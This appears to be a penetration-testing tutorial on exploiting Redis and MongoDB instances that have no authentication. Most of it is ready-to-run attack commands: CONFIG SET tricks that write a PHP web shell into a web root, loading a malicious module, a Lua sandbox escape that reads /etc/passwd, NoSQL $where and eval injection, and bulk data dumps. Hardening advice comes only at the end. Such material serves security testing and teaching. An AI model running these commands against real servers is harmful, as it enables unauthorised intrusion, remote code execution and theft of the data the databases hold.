# Redis and MongoDB Unauthenticated Access Guide

> Covers exploitation of Redis and MongoDB instances with default or missing authentication, including INFO enumeration, CONFIG SET abuse, module loading, Lua sandbox escape, NoSQL injection, and data exfiltration techniques.

## Overview

Redis and MongoDB are frequently deployed without authentication in internal networks, development environments, and sometimes even in production. Both databases are designed for high performance and ease of use, with security often treated as an afterthought. Redis defaults to binding on all interfaces with no password prior to version 6, and MongoDB defaulted to no authentication until version 3.6. Even in current versions, many deployments disable or misconfigure authentication for performance or operational convenience.

The attack surface for these databases is fundamentally different from traditional SQL databases — there are no SQL injection vectors at the protocol level, but the feature set (Lua scripting in Redis, JavaScript execution in MongoDB, file system access in both) provides powerful exploitation paths.

## Redis Exploitation

### INFO Enumeration

The `INFO` command is the entry point for Redis reconnaissance. It returns server configuration, memory usage, connected clients, keyspace statistics, and more — all without authentication on an unsecured instance.

```bash
# Full server information
redis-cli -h 192.168.1.100 INFO server

# Keyspace statistics (database and key counts)
redis-cli -h 192.168.1.100 INFO keyspace

# Memory usage and configuration
redis-cli -h 192.168.1.100 INFO memory

# Connected clients (identify other applications)
redis-cli -h 192.168.1.100 INFO clients
```

The INFO output reveals the Redis version (critical for vulnerability matching), operating system, uptime, number of databases, total keys, and connected clients. This information shapes the exploitation strategy.

### CONFIG SET Exploitation

Redis allows runtime configuration changes via `CONFIG SET`, which is the foundation for the most damaging Redis attacks. The key insight is that Redis persists data to disk by default, and the file path is configurable.

```bash
# Check current configuration
redis-cli -h 192.168.1.100 CONFIG GET dir
redis-cli -h 192.168.1.100 CONFIG GET dbfilename

# Write to arbitrary file by changing the data directory and filename
redis-cli -h 192.168.1.100 CONFIG SET dir /var/www/html
redis-cli -h 192.168.1.100 CONFIG SET dbfilename shell.php
redis-cli -h 192.168.1.100 SET payload '<?php system($_GET["cmd"]); ?>'
redis-cli -h 192.168.1.100 SAVE
```

This technique works for writing SSH authorized_keys, cron jobs, web shells, and any other file that the Redis process has write access to. The most reliable target is SSH authorized_keys because it requires no special formatting — Redis data files happen to contain the key data in a format that SSH tolerates due to the key being on its own line.

### Module Loading

Redis supports loadable modules that extend its functionality. If module loading is enabled, an attacker can load a malicious shared library for arbitrary code execution.

```bash
# Load a malicious module
redis-cli -h 192.168.1.100 MODULE LOAD /tmp/exploit.so

# List loaded modules
redis-cli -h 192.168.1.100 MODULE LIST
```

Module loading requires the Redis process to have file system access to the .so file, which means the attacker needs a way to upload the file first (via another vulnerability, or by using the CONFIG SET technique to write it).

### Lua Sandbox Escape

Redis supports server-side Lua scripting via the `EVAL` command. The Lua sandbox restricts file and network access, but certain Redis versions have sandbox escape vulnerabilities.

```bash
# Standard Lua execution (sandboxed)
redis-cli -h 192.168.1.100 EVAL "return redis.call('INFO')" 0

# Attempt file read (sandbox escape, version-dependent)
redis-cli -h 192.168.1.100 EVAL \
  "local f=io.open('/etc/passwd','r'); return f:read('*all'); f:close()" 0
```

Redis versions before 5.0.13 with specific configurations may allow `io` and `os` library access, enabling full file system interaction and command execution from within the Lua sandbox.

## MongoDB Exploitation

### Unauthenticated Access and Enumeration

MongoDB's default configuration prior to version 3.6 accepted connections without authentication. Even in newer versions, authentication must be explicitly enabled, and many deployments skip this step.

```bash
# Enumerate all databases
mongo --host 192.168.1.100 --eval "db.adminCommand('listDatabases')"

# Enumerate collections in a target database
mongo --host 192.168.1.100 --eval \
  "db = db.getSiblingDB('target_db'); db.getCollectionNames()"

# Count documents in sensitive collections
mongo --host 192.168.1.100 --eval \
  "db = db.getSiblingDB('target_db'); db.users.count()"
```

### mongoaudit Security Assessment

mongoaudit automates the security assessment of MongoDB instances, checking for common misconfigurations including missing authentication, excessive privileges, exposed interfaces, and known vulnerabilities.

```bash
# Full audit
mongoaudit -h 192.168.1.100 -p 27017
```

mongoaudit checks: authentication status, SSL/TLS configuration, network exposure, role-based access control setup, JavaScript execution settings, and known CVEs for the detected version.

### NoSQL Injection

MongoDB's query language uses JavaScript objects, which creates injection vectors when application code constructs queries from user input. At the database protocol level, NoSQL injection is less common but still possible through eval, $where, and MapReduce functions.

```bash
# $where injection with JavaScript
mongo --host 192.168.1.100 --eval \
  "db.users.find({\$where: 'this.password.match(/^admin/) && sleep(5000)'})"

# eval-based code execution (requires specific roles)
mongo --host 192.168.1.100 --eval \
  "db.eval('function(){return db.users.find().toArray()}')"
```

### Data Exfiltration

MongoDB provides efficient tools for bulk data extraction, which is useful for demonstrating the impact of unauthenticated access.

```bash
# Export collection to JSON
mongoexport --host 192.168.1.100 --db target_db --collection users --out users.json

# Full database dump
mongodump --host 192.168.1.100 --db target_db --out /tmp/mongo_dump
```

## Defense Recommendations

**Redis**: Enable authentication with a strong password (`requirepass`), bind to specific interfaces only, disable CONFIG SET for production (use `rename-command` to disable dangerous commands), disable module loading, and run Redis as a low-privilege user with no shell access. Redis 6+ supports ACLs for fine-grained access control.

**MongoDB**: Enable authentication (`--auth` flag), use role-based access control with least-privilege roles, enable TLS for all connections, disable JavaScript execution (`--noscripting`), bind to specific interfaces, and use the security checklist from MongoDB documentation. Enable audit logging to track all administrative operations.
